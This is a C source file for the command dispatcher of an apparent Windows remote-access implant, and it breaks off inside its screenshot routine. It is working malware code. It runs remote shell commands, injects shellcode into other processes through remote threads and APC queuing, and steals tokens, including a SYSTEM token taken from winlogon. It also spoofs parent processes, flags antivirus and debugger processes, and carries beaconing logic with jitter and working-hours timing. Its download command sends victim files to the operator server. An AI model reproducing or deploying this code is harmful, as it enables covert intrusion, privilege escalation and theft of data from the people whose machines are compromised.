#include "commands.h"
#include "kerberos.h"
#include "transport.h"
#include "config.h"
#include "evasion.h"
#include "b64.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include "api_resolve.h"
#include "pe_exec.h"

/* Runtime working-hours window ("HH:MM-HH:MM" or "" = always beacon) */
char g_working_hours[32] = {0};

// Dynamic sleep/jitter (updated by SLEEP command)
int g_sleep_sec  = AGENT_SLEEP_SEC;
int g_jitter_pct = AGENT_JITTER_PCT;

// ── Working hours ─────────────────────────────────────────────────────────────

int in_working_hours(void) {
    if (!g_working_hours[0]) return 1;  /* empty = always beacon */
    char *dash = strchr(g_working_hours, '-');
    if (!dash) return 1;
    int sh=0,sm=0,eh=0,em=0;
    sscanf(g_working_hours, "%d:%d", &sh, &sm);
    sscanf(dash+1, "%d:%d", &eh, &em);
    SYSTEMTIME st; GetLocalTime(&st);
    int cur = (int)st.wHour * 60 + (int)st.wMinute;
    int s = sh*60+sm, e = eh*60+em;
    if (s <= e) return cur >= s && cur < e;
    return cur >= s || cur < e;  /* overnight */
}

void sleep_until_work_hours(void) {
    if (!g_working_hours[0]) return;
    char *dash = strchr(g_working_hours, '-');
    if (!dash) return;
    int sh=0,sm=0;
    sscanf(g_working_hours, "%d:%d", &sh, &sm);
    SYSTEMTIME st; GetLocalTime(&st);
    int cur = (int)st.wHour * 60 + (int)st.wMinute;
    int s = sh*60+sm;
    int wait_min = (cur < s) ? s - cur : (24*60 - cur) + s;
    if (wait_min > 0) sleep_masked((DWORD)wait_min * 60 * 1000);
}

// ── Shell execution ───────────────────────────────────────────────────────────

static char* run_shell(const char *cmd) {
    // Use _popen to capture stdout+stderr
    char full_cmd[4096];
    snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /s /c \"%s\" 2>&1", cmd);

    FILE *f = _popen(full_cmd, "r");
    if (!f) return strdup("[error: popen failed]");

    size_t cap = 4096, len = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) { _pclose(f); return strdup("[error: oom]"); }

    int c;
    while ((c = fgetc(f)) != EOF) {
        if (len + 2 >= cap) {
            cap *= 2;
            char *nb = (char*)realloc(buf, cap);
            if (!nb) break;
            buf = nb;
        }
        buf[len++] = (char)c;
    }
    buf[len] = '\0';
    _pclose(f);
    return buf;
}

// ── Directory listing ─────────────────────────────────────────────────────────

static char* do_ls(const char *path) {
    char pattern[MAX_PATH];
    if (!path || !path[0]) {
        GetCurrentDirectoryA(sizeof(pattern), pattern);
        strncat(pattern, "\\*", sizeof(pattern) - strlen(pattern) - 1);
    } else {
        snprintf(pattern, sizeof(pattern), "%s\\*", path);
    }

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return strdup("[error listing]");

    size_t cap = 4096, len = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) { FindClose(h); return strdup("[oom]"); }
    buf[0] = '\0';

    do {
        char line[MAX_PATH + 4];
        const char *kind = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "D" : "F";
        // Build full path for display
        char dir[MAX_PATH];
        if (!path || !path[0]) GetCurrentDirectoryA(sizeof(dir), dir);
        else strncpy(dir, path, sizeof(dir) - 1);
        snprintf(line, sizeof(line), "%s  %s\\%s\n", kind, dir, fd.cFileName);

        size_t ll = strlen(line);
        if (len + ll + 2 >= cap) {
            cap = len + ll + 4096;
            char *nb = (char*)realloc(buf, cap);
            if (!nb) break;
            buf = nb;
        }
        strncat(buf + len, line, cap - len - 1);
        len += ll;
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return buf;
}

static void escape_json_str(char *out, size_t outsz, const char *in) {
    size_t o = 0;
    for (size_t i = 0; in[i] && o + 3 < outsz; i++) {
        if      (in[i] == '\\') { out[o++] = '\\'; out[o++] = '\\'; }
        else if (in[i] == '"')  { out[o++] = '\\'; out[o++] = '"'; }
        else                     { out[o++] = in[i]; }
    }
    out[o] = '\0';
}

static char* do_ls_json(const char *path) {
    char dir[MAX_PATH];
    if (!path || !path[0]) {
        GetCurrentDirectoryA(sizeof(dir), dir);
    } else {
        char abs[MAX_PATH];
        if (GetFullPathNameA(path, sizeof(abs), abs, NULL))
            strncpy(dir, abs, sizeof(dir) - 1);
        else
            strncpy(dir, path, sizeof(dir) - 1);
        dir[sizeof(dir) - 1] = '\0';
    }

    char cwd[MAX_PATH];
    GetCurrentDirectoryA(sizeof(cwd), cwd);

    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);

    char cwd_esc[MAX_PATH * 2], dir_esc[MAX_PATH * 2];
    escape_json_str(cwd_esc, sizeof(cwd_esc), cwd);
    escape_json_str(dir_esc, sizeof(dir_esc), dir);

    size_t cap = 16384, len = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) return strdup("{\"error\":\"oom\"}");

    len = (size_t)snprintf(buf, cap, "{\"cwd\":\"%s\",\"path\":\"%s\",\"entries\":[",
                           cwd_esc, dir_esc);

    if (h == INVALID_HANDLE_VALUE) {
        snprintf(buf + len, cap - len, "]}");
        return buf;
    }

    int first = 1;
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;

        int is_dir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0;
        ULONGLONG sz = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;

        SYSTEMTIME st;
        FileTimeToSystemTime(&fd.ftLastWriteTime, &st);
        char mod[32];
        snprintf(mod, sizeof(mod), "%04d-%02d-%02d %02d:%02d",
                 st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

        char name_esc[MAX_PATH * 2];
        escape_json_str(name_esc, sizeof(name_esc), fd.cFileName);

        char entry[MAX_PATH * 3];
        int elen = snprintf(entry, sizeof(entry),
                            "%s{\"name\":\"%s\",\"is_dir\":%s,\"size\":%llu,\"mod\":\"%s\"}",
                            first ? "" : ",",
                            name_esc,
                            is_dir ? "true" : "false",
                            (unsigned long long)sz,
                            mod);
        first = 0;

        if (len + (size_t)elen + 4 >= cap) {
            cap = len + (size_t)elen + 4096;
            char *nb = (char*)realloc(buf, cap);
            if (!nb) break;
            buf = nb;
        }
        memcpy(buf + len, entry, (size_t)elen);
        len += (size_t)elen;
    } while (FindNextFileA(h, &fd));

    FindClose(h);
    if (len + 3 >= cap) { char *nb = (char*)realloc(buf, len + 4); if (nb) buf = nb; }
    buf[len++] = ']'; buf[len++] = '}'; buf[len] = '\0';
    return buf;
}

// ── Sysinfo ───────────────────────────────────────────────────────────────────

static char* do_sysinfo(void) {
    char hostname[128] = "UNKNOWN", username[128] = "UNKNOWN";
    DWORD h_sz = sizeof(hostname), u_sz = sizeof(username);
    GetComputerNameA(hostname, &h_sz);
    GetUserNameA(username, &u_sz);
    char *buf = (char*)malloc(512);
    if (!buf) return strdup("oom");
    snprintf(buf, 512,
        "hostname=%s\nusername=%s\nos=windows/amd64\npid=%lu",
        hostname, username, (unsigned long)GetCurrentProcessId());
    return buf;
}

// ── Jitter sleep ──────────────────────────────────────────────────────────────

unsigned long sleep_ms_jitter(void) {
    unsigned long base = (unsigned long)g_sleep_sec * 1000;
    if (g_jitter_pct <= 0) return base;
    unsigned long jit = base * g_jitter_pct / 100;
    unsigned long r;
    BCryptGenRandom(NULL, (PUCHAR)&r, sizeof(r), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    long long delta = (long long)(r % (jit * 2 + 1)) - (long long)jit;
    long long ms = (long long)base + delta;
    if (ms < 1000) ms = 1000;
    return (unsigned long)ms;
}

// ── JSON helpers ─────────────────────────────────────────────────────────────

static int json_get_int(const char *json, const char *key, int def) {
    char pat[128]; snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(json, pat); if (!p) return def;
    p = strchr(p, ':'); if (!p) return def;
    int v; return sscanf(p+1, " %d", &v) == 1 ? v : def;
}

static void json_get_str(const char *json, const char *key, char *out, size_t out_sz, const char *def) {
    char pat[128]; snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(json, pat);
    if (!p) { strncpy(out, def, out_sz-1); out[out_sz-1]='\0'; return; }
    p = strchr(p + strlen(pat), '"');
    if (!p) { strncpy(out, def, out_sz-1); out[out_sz-1]='\0'; return; }
    p++;
    size_t i = 0;
    while (*p && *p != '"' && i < out_sz-1) {
        if (*p == '\\' && *(p+1)) {
            p++;
            if      (*p == '\\') out[i++] = '\\';
            else if (*p == '"')  out[i++] = '"';
            else if (*p == '/')  out[i++] = '/';
            else if (*p == 'n')  out[i++] = '\n';
            else if (*p == 'r')  out[i++] = '\r';
            else if (*p == 't')  out[i++] = '\t';
            else if (*p == 'u' && i < out_sz-2) {
                /* \uXXXX — handle BMP ASCII range only */
                char hex[5]={0}; int valid=1;
                for (int h=0;h<4;h++) { if (!*(p+1+h)) {valid=0;break;} hex[h]=*(p+1+h); }
                if (valid) { int cp=(int)strtol(hex,NULL,16); p+=4; if(cp>0&&cp<128) out[i++]=(char)cp; }
                else out[i++] = '?';
            } else out[i++] = *p;
        } else out[i++] = *p;
        p++;
    }
    out[i] = '\0';
}

// ── Process injection ─────────────────────────────────────────────────────────

static char *inject_remote(int pid, const uint8_t *sc, size_t sc_len) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed (err %lu)",GetLastError()); return e; }
    LPVOID mem = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"VirtualAllocEx failed %lu",GetLastError()); return e; }
    SIZE_T written = 0;
    WriteProcessMemory(hProc, mem, sc, sc_len, &written);
    DWORD old; VirtualProtectEx(hProc, mem, sc_len, PAGE_EXECUTE_READ, &old);
    DWORD tid = 0;
    HANDLE ht = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, &tid);
    if (!ht) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"CreateRemoteThread failed %lu",GetLastError()); return e; }
    CloseHandle(ht); CloseHandle(hProc);
    char *out = (char*)malloc(128);
    snprintf(out, 128, "[+] injected %zu bytes into PID %d (TID=%lu)", sc_len, pid, (unsigned long)tid);
    return out;
}

static char *inject_apc(int pid, const uint8_t *sc, size_t sc_len) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed %lu",GetLastError()); return e; }
    LPVOID mem = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"VirtualAllocEx failed %lu",GetLastError()); return e; }
    SIZE_T written = 0;
    WriteProcessMemory(hProc, mem, sc, sc_len, &written);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) { CloseHandle(hProc); return strdup("snapshot failed"); }
    THREADENTRY32 te; te.dwSize = sizeof(te);
    int queued = 0;
    if (Thread32First(snap, &te)) {
        do {
            if ((int)te.th32OwnerProcessID == pid) {
                HANDLE ht = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (ht) { QueueUserAPC((PAPCFUNC)mem, ht, 0); CloseHandle(ht); queued++; }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap); CloseHandle(hProc);
    char *out = (char*)malloc(64);
    snprintf(out, 64, "[+] APC queued to %d thread(s) in PID %d", queued, pid);
    return out;
}

// ── Token operations ──────────────────────────────────────────────────────────

static int enable_privilege(HANDLE hToken, const char *priv_name) {
    LUID luid;
    if (!LookupPrivilegeValueA(NULL, priv_name, &luid)) return 0;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) ? 1 : 0;
}

static char *token_steal(int pid) {
    HANDLE hSelf;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hSelf)) {
        enable_privilege(hSelf, "SeDebugPrivilege"); CloseHandle(hSelf);
    }
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);
    if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed (err %lu)",GetLastError()); return e; }
    HANDLE hTok;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE|TOKEN_QUERY, &hTok)) {
        CloseHandle(hProc);
        char *e=(char*)malloc(64); snprintf(e,64,"OpenProcessToken failed (err %lu)",GetLastError()); return e;
    }
    CloseHandle(hProc);
    HANDLE hDup;
    if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenImpersonation, &hDup)) {
        CloseHandle(hTok);
        char *e=(char*)malloc(64); snprintf(e,64,"DuplicateTokenEx failed (err %lu)",GetLastError()); return e;
    }
    CloseHandle(hTok);
    if (!ImpersonateLoggedOnUser(hDup)) {
        CloseHandle(hDup);
        char *e=(char*)malloc(64); snprintf(e,64,"ImpersonateLoggedOnUser failed (err %lu)",GetLastError()); return e;
    }
    CloseHandle(hDup);
    char *out=(char*)malloc(64); snprintf(out,64,"[+] impersonating token from PID %d",pid); return out;
}

static char *token_make(const char *user, const char *domain, const char *pass) {
    WCHAR wu[256], wd[256], wp[256];
    MultiByteToWideChar(CP_UTF8,0,user,-1,wu,256);
    MultiByteToWideChar(CP_UTF8,0,domain,-1,wd,256);
    MultiByteToWideChar(CP_UTF8,0,pass,-1,wp,256);
    HANDLE hTok;
    if (!LogonUserW(wu, wd, wp, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hTok)) {
        char *e=(char*)malloc(64); snprintf(e,64,"LogonUser failed (err %lu)",GetLastError()); return e;
    }
    if (!ImpersonateLoggedOnUser(hTok)) {
        CloseHandle(hTok);
        char *e=(char*)malloc(64); snprintf(e,64,"ImpersonateLoggedOnUser failed (err %lu)",GetLastError()); return e;
    }
    CloseHandle(hTok);
    char *out=(char*)malloc(256); snprintf(out,256,"[+] impersonating %s\\%s",domain,user); return out;
}

static char *get_system(void) {
    HANDLE hSelf;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hSelf)) {
        enable_privilege(hSelf, "SeDebugPrivilege"); CloseHandle(hSelf);
    }
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return strdup("CreateToolhelp32Snapshot failed");
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    DWORD sysPid = 0;
    if (Process32First(snap, &pe)) {
        do { if (_stricmp(pe.szExeFile, "winlogon.exe") == 0) { sysPid = pe.th32ProcessID; break; } }
        while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    if (!sysPid) return strdup("winlogon.exe not found");
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, sysPid);
    if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed %lu",GetLastError()); return e; }
    HANDLE hTok;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hTok)) {
        CloseHandle(hProc);
        char *e=(char*)malloc(64); snprintf(e,64,"OpenProcessToken failed %lu",GetLastError()); return e;
    }
    CloseHandle(hProc);
    HANDLE hDup;
    if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDup)) {
        CloseHandle(hTok);
        char *e=(char*)malloc(64); snprintf(e,64,"DuplicateTokenEx failed %lu",GetLastError()); return e;
    }
    CloseHandle(hTok);
    if (!ImpersonateLoggedOnUser(hDup)) {
        CloseHandle(hDup);
        char *e=(char*)malloc(64); snprintf(e,64,"ImpersonateLoggedOnUser failed %lu",GetLastError()); return e;
    }
    CloseHandle(hDup);
    char *out=(char*)malloc(128); snprintf(out,128,"[+] SYSTEM token (winlogon PID=%lu)",(unsigned long)sysPid); return out;
}

// ── Dispatcher ────────────────────────────────────────────────────────────────

void dispatch_task(AgentTask *task) {
    const char *args = task->args ? task->args : "";
    char type_upper[64];
    strncpy(type_upper, task->type, sizeof(type_upper) - 1);
    for (int i = 0; type_upper[i]; i++) type_upper[i] = (char)toupper((unsigned char)type_upper[i]);

    if (strcmp(type_upper, "SHELL") == 0) {
        char *out = run_shell(args);
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "SLEEP") == 0) {
        int sec = -1, jit = -1;
        sscanf(args, "%d %d", &sec, &jit);
        if (sec >= 0) g_sleep_sec  = sec;
        if (jit >= 0) g_jitter_pct = jit;
        agent_send_result(task->id, "[+] sleep updated", "");
    }
    else if (strcmp(type_upper, "SYSINFO") == 0) {
        char *out = do_sysinfo();
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "PS") == 0) {
        char *out = run_shell("tasklist /FO CSV /NH 2>&1");
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "PS_JSON") == 0) {
        /* Return JSON array [{pid:N,name:"..."},...] via CreateToolhelp32Snapshot
         * — no OpenProcess needed, so all processes (including SYSTEM) are visible */
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) {
            agent_send_result(task->id, "", "CreateToolhelp32Snapshot failed"); return;
        }
        /* Pre-build security-tool set for labelling */
        static const char *SEC_TOOLS[] = {
            "msseces.exe","msmpeng.exe","mcshield.exe","avgwdsvc.exe","avguard.exe",
            "bdagent.exe","ekrn.exe","fshoster32.exe","sophosav.exe","mbam.exe",
            "wireshark.exe","fiddler.exe","x64dbg.exe","ollydbg.exe","idaq.exe","idaq64.exe",
            "procmon.exe","procmon64.exe","procexp.exe","procexp64.exe",NULL
        };
        /* Grow buffer dynamically */
        size_t cap = 65536, len = 0;
        char *buf = (char*)malloc(cap);
        if (!buf) { CloseHandle(snap); agent_send_result(task->id,"","oom"); return; }
        buf[len++] = '[';

        PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
        BOOL first_entry = TRUE;
        if (Process32First(snap, &pe)) {
            do {
                /* check security tool */
                const char *sec = "";
                for (int si = 0; SEC_TOOLS[si]; si++) {
                    if (_stricmp(pe.szExeFile, SEC_TOOLS[si]) == 0) { sec = "AV/EDR"; break; }
                }
                char entry[512];
                int elen = snprintf(entry, sizeof(entry),
                    "%s{\"pid\":%lu,\"name\":\"%s\"%s%s}",
                    first_entry ? "" : ",",
                    (unsigned long)pe.th32ProcessID,
                    pe.szExeFile,
                    sec[0] ? ",\"security\":\"" : "",
                    sec[0] ? "AV/EDR\"" : "");
                first_entry = FALSE;
                /* grow if needed */
                while (len + (size_t)elen + 4 >= cap) {
                    cap *= 2;
                    char *nb = (char*)realloc(buf, cap);
                    if (!nb) { free(buf); CloseHandle(snap); agent_send_result(task->id,"","oom"); return; }
                    buf = nb;
                }
                memcpy(buf + len, entry, (size_t)elen);
                len += (size_t)elen;
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
        buf[len++] = ']';
        buf[len]   = '\0';
        agent_send_result(task->id, buf, "");
        free(buf);
    }
    else if (strcmp(type_upper, "PWD") == 0) {
        char cwd[MAX_PATH] = {0};
        GetCurrentDirectoryA(sizeof(cwd), cwd);
        agent_send_result(task->id, cwd, "");
    }
    else if (strcmp(type_upper, "CD") == 0) {
        if (SetCurrentDirectoryA(args)) {
            char cwd[MAX_PATH] = {0};
            GetCurrentDirectoryA(sizeof(cwd), cwd);
            agent_send_result(task->id, cwd, "");
        } else {
            char err[64];
            snprintf(err, sizeof(err), "cd: error %lu", GetLastError());
            agent_send_result(task->id, "", err);
        }
    }
    else if (strcmp(type_upper, "LS") == 0) {
        char *out = do_ls(args);
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "LS_JSON") == 0) {
        char *out = do_ls_json(args);
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "GETPID") == 0) {
        char buf[32];
        snprintf(buf, sizeof(buf), "%lu", GetCurrentProcessId());
        agent_send_result(task->id, buf, "");
    }
    else if (strcmp(type_upper, "PPID") == 0) {
        /* args JSON: {"cmd":"notepad.exe","parent":"explorer.exe"}
         * Runs in a thread with 10 s timeout so an AV-induced hang or SEH
         * exception inside CreateProcessW cannot kill the main dispatcher. */
        char cmd[512] = {0}, parent[128] = "explorer.exe";
        const char *p = strstr(args, "\"cmd\"");
        if (p) { p = strchr(p+5,'"'); if(p){p++; size_t i=0; while(*p&&*p!='"'&&i<511) cmd[i++]=*p++; cmd[i]='\0'; } }
        p = strstr(args, "\"parent\"");
        if (p) { p = strchr(p+8,'"'); if(p){p++; size_t i=0; while(*p&&*p!='"'&&i<127) parent[i++]=*p++; parent[i]='\0'; } }
        if (!cmd[0]) strncpy(cmd, "cmd.exe", sizeof(cmd)-1);

        PpidWork *work = (PpidWork *)calloc(1, sizeof(PpidWork));
        if (!work) { agent_send_result(task->id, "", "ppid: alloc failed"); }
        else {
            strncpy(work->cmd,    cmd,    sizeof(work->cmd)    - 1);
            strncpy(work->parent, parent, sizeof(work->parent) - 1);
            HANDLE hTh = CreateThread(NULL, 0, ppid_worker, work, 0, NULL);
            if (!hTh) {
                free(work);
                agent_send_result(task->id, "", "ppid: thread failed");
            } else {
                DWORD waited = WaitForSingleObject(hTh, 10000);
                CloseHandle(hTh);
                if (waited == WAIT_TIMEOUT) {
                    /* Thread leaked intentionally — may still be in CreateProcessW */
                    agent_send_result(task->id, "", "ppid: timed out");
                } else {
                    int ok = work->ok;
                    free(work);
                    if      (ok ==  1) agent_send_result(task->id, "[+] spawned", "");
                    else if (ok == -2) agent_send_result(task->id, "", "ppid: exception in spawn");
                    else { char err[64]; snprintf(err,sizeof(err),"ppid: failed (err %lu)",GetLastError()); agent_send_result(task->id,"",err); }
                }
            }
        }
    }
    else if (strcmp(type_upper, "CONFIG") == 0) {
        /* args JSON: {"sleep_sec":N,"jitter_pct":N,"working_hours":"HH:MM-HH:MM"} */
        int new_sec = -1, new_jit = -1;
        const char *p = strstr(args, "\"sleep_sec\"");
        if (p) { p = strchr(p+11,':'); if(p) sscanf(p+1," %d",&new_sec); }
        p = strstr(args, "\"jitter_pct\"");
        if (p) { p = strchr(p+12,':'); if(p) sscanf(p+1," %d",&new_jit); }
        p = strstr(args, "\"working_hours\"");
        if (p) { p = strchr(p+15,'"'); if(p){p++; size_t i=0; while(*p&&*p!='"'&&i<31) g_working_hours[i++]=*p++; g_working_hours[i]='\0'; } }
        if (new_sec >= 0) g_sleep_sec  = new_sec;
        if (new_jit >= 0) g_jitter_pct = new_jit;
        agent_send_result(task->id, "[+] config updated", "");
    }
    else if (strcmp(type_upper, "KILL") == 0) {
        agent_send_result(task->id, "bye", "");
        ExitProcess(0);
    }
    else if (strcmp(type_upper, "CAT") == 0) {
        HANDLE hf = CreateFileA(args, GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            char err[64];
            snprintf(err, sizeof(err), "open: error %lu", GetLastError());
            agent_send_result(task->id, "", err);
        } else {
            DWORD fsz = GetFileSize(hf, NULL);
            char *buf = (char*)malloc(fsz + 1);
            DWORD rd = 0;
            ReadFile(hf, buf, fsz, &rd, NULL);
            CloseHandle(hf);
            buf[rd] = '\0';
            agent_send_result(task->id, buf, "");
            free(buf);
        }
    }
    else if (strcmp(type_upper, "MKDIR") == 0) {
        if (CreateDirectoryA(args, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
            agent_send_result(task->id, "[+] created", "");
        else {
            char err[64]; snprintf(err, sizeof(err), "mkdir: error %lu", GetLastError());
            agent_send_result(task->id, "", err);
        }
    }
    else if (strcmp(type_upper, "RM") == 0) {
        DWORD attr = GetFileAttributesA(args);
        int r;
        if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
            char cmd_rm[MAX_PATH + 32];
            snprintf(cmd_rm, sizeof(cmd_rm), "rmdir /s /q \"%s\" 2>&1", args);
            char *out = run_shell(cmd_rm);
            r = (out && out[0] == '\0') ? 1 : 0;
            if (r) { free(out); agent_send_result(task->id, "[+] removed", ""); }
            else { agent_send_result(task->id, out ? out : "", ""); if(out) free(out); }
        } else {
            r = DeleteFileA(args);
            if (r) agent_send_result(task->id, "[+] removed", "");
            else {
                char err[64]; snprintf(err, sizeof(err), "rm: error %lu", GetLastError());
                agent_send_result(task->id, "", err);
            }
        }
    }
    else if (strcmp(type_upper, "UPLOAD") == 0) {
        // args = JSON {"filename":"...","remote_path":"..."}
        char filename[256] = {0}, remote_path[MAX_PATH] = {0};
        // minimal JSON extraction
        const char *p = strstr(args, "\"filename\"");
        if (p) {
            p = strchr(p + 10, '"'); if (p) { p++;
            size_t i = 0;
            while (*p && *p != '"' && i < sizeof(filename)-1) filename[i++] = *p++;
            filename[i] = '\0'; }
        }
        p = strstr(args, "\"remote_path\"");
        if (p) {
            p = strchr(p + 13, '"'); if (p) { p++;
            size_t i = 0;
            while (*p && *p != '"' && i < sizeof(remote_path)-1) remote_path[i++] = *p++;
            remote_path[i] = '\0'; }
        }
        if (!filename[0] || !remote_path[0]) {
            agent_send_result(task->id, "", "upload: missing fields"); return;
        }
        size_t data_len = 0;
        uint8_t *data = agent_download_file(filename, &data_len);
        if (!data) { agent_send_result(task->id, "", "download from server failed"); return; }
        HANDLE hf = CreateFileA(remote_path, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            free(data);
            char err[64]; snprintf(err, sizeof(err), "write: error %lu", GetLastError());
            agent_send_result(task->id, "", err); return;
        }
        DWORD wr = 0;
        WriteFile(hf, data, (DWORD)data_len, &wr, NULL);
        CloseHandle(hf);
        free(data);
        char msg[256];
        snprintf(msg, sizeof(msg), "written %zu bytes to %s", data_len, remote_path);
        agent_send_result(task->id, msg, "");
    }
    else if (strcmp(type_upper, "DOWNLOAD") == 0) {
        HANDLE hf = CreateFileA(args, GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            char err[64]; snprintf(err, sizeof(err), "read: error %lu", GetLastError());
            agent_send_result(task->id, "", err); return;
        }
        DWORD fsz = GetFileSize(hf, NULL);
        uint8_t *buf = (uint8_t*)malloc(fsz);
        DWORD rd = 0;
        ReadFile(hf, buf, fsz, &rd, NULL);
        CloseHandle(hf);
        const char *name = strrchr(args, '\\');
        name = name ? name + 1 : args;
        agent_upload_file(task->id, name, buf, rd);
        free(buf);
        char msg[128];
        snprintf(msg, sizeof(msg), "uploaded %lu bytes", rd);
        agent_send_result(task->id, msg, "");
    }
    else if (strcmp(type_upper, "SCREENSHOT") == 0) {
        /* Native GDI capture with WinSta0/Default desktop access so it works
         * from session 0 (SYSTEM service) when an interactive session exists.
         * Output is a BMP file (GUI accepts .bmp). */
        const char *sc_path = "C:\\Windows\\Temp\\_sc.bmp";

        HWINSTA hOrigSta = GetProcessWindowStation();
        HWINSTA hSta = OpenWindowStationA("WinSta0", FALSE,
            WINSTA_ALL_ACCESS | READ_CONTROL);
        if (hSta) SetProcessWindowStation(hSta);

        HDESK hOrigDesk = GetThreadDesktop(GetCurrentThreadId());
        /* DESKTOP_ALL_ACCESS not defined in older MinGW — use explicit mask */
        DWORD desk_access = DESKTOP_READOBJECTS|DESKTOP_CREATEWINDOW|DESKTOP_CREATEMENU|
                            DESKTOP_HOOKCONTROL|DESKTOP_JOURNALRECORD|DESKTOP_JOURNALPLAYBACK|
                            DESKTOP_ENUMERATE|DESKTOP_WRITEOBJECTS|DESKTOP_SWITCHDESKTOP|READ_CONTROL;
        HDESK hDesk = OpenDesktopA("Default", 0, FALSE, desk_access);
        if (hDesk) SetThreadDesktop(hDesk);

        HDC hDC   = GetDC(NULL);
        int sw    = GetSystemMetrics(SM_CXSCREEN);
        int sh    = GetSystemMetrics(SM_CYSCREEN);

        int ok_flag = 0;
        if (hDC && sw > 0 && sh > 0) {
            HDC hMemDC = CreateCompatibleDC(hDC);
            HBITMAP hBmp = CreateCompatibleBitmap(hDC, sw, sh);
            HGDIOBJ hOld = SelectObject(hMemDC, hBmp);
            BitBlt(hMemDC, 0, 0, sw, sh, hDC, 0, 0, SRCCOPY | CAPTUREBLT);
            SelectObject(hMemDC, hOld);

            BITMAPINFOHEADER bi = {0};
            bi.biSize        = sizeof(bi);
            bi.biWidth       = sw;
            bi.biHeight      = -sh; /* top-down */
            bi.biPlanes      = 1;
            bi.biBitCount    = 24;
            bi.biCompression = BI_RGB;
            int row_sz = (sw * 3 + 3) & ~3;
            DWORD data_sz = (DWORD)((size_t)row_sz * (size_t)sh);
            uint8_t *pixels = (uint8_t*)malloc(data_sz);
            if (pixels) {
